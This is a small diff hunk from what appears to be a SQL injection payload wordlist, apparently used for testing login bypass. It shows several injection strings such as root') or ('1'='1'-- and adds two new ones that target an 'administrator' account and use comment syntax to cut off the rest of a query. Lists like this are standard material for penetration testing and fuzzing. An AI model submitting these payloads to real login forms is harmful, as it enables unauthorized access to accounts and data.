@@ -93,4 +93,5 @@ root') or ('1'='1'#
 root') or ('1'='1'--
 root') or ('1'='1'/*
 root'/*
-root'or 1=1 or ''='
+root'or 1=1 or ''='administrator'--
+administrator' #
